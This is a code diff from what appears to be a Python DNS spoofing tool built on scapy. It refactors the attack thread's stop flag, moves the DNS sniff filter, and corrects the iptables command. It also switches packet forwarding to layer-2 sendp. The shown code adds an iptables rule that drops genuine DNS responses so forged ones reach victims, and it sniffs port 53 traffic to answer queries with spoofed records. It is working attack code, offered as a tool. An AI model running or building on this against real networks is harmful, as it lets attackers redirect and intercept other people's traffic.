@@ -3,16 +3,12 @@
 import threading
 import time
 import click
-from scapy.all import DNS, UDP, IP, DNSRR, send, sniff
+from scapy.all import DNS, UDP, IP, DNSRR, send, sniff, sendp
 from .domains import get_domains
 from .general import get_interface
 import subprocess
 
-# Port used for sniffing dns queries
-port = "udp port 53"
 
-# Global flag to indicate when to stop sniffing
-stop_event = threading.Event()
 
 def spoof_dns_all(interface):
     '''
@@ -46,26 +42,29 @@ def start_attack(table, interface):
     subprocess.run(['iptables', '-A', 'FORWARD', '-p', 'udp', '--sport', '53', '-j' 'DROP'])
 
     # Start subthread running attack
-    attack_thread = threading.Thread(target=attack, args=(table,interface,))
+    stop_event = threading.Event()
+    attack_thread = threading.Thread(target=attack, args=(table,interface,stop_event))
     attack_thread.start()
 
     try:
         # Wait for keyboard interrupt
         while True:
             time.sleep(2)
-            print('dns spoofing')
     except KeyboardInterrupt:
         # Set stop_event when keyboard interrupt occurs
         print('resetting ip tables')
-        subprocess.run(['iptables', '-D', 'FORWARD', '-d', '-p', 'udp', '--sport', '53', '-j' 'DROP'])
+        subprocess.run(['iptables', '-D', 'FORWARD', '-p', 'udp', '--sport', '53', '-j' 'DROP'])
         stop_event.set()
         attack_thread.join()
 
 
-def attack(table, interface):
+def attack(table, interface, stop_event):
     '''
     Sniffs network for DNS packets
     '''
+    
+    # Port used for sniffing dns queries
+    port = "udp port 53"
 
     sniff(filter=port, iface=interface, prn=lambda pkt: analyze_packet(pkt, table, interface), stop_filter=stop_event.is_set())
 
@@ -130,7 +129,7 @@ def forward_dns(packet, interface):
     Forwards the normal dns response
     '''
 
-    send(packet, iface=interface)
+    sendp(packet, iface=interface)
 
 
 def get_packet_query_name(dns_packet):
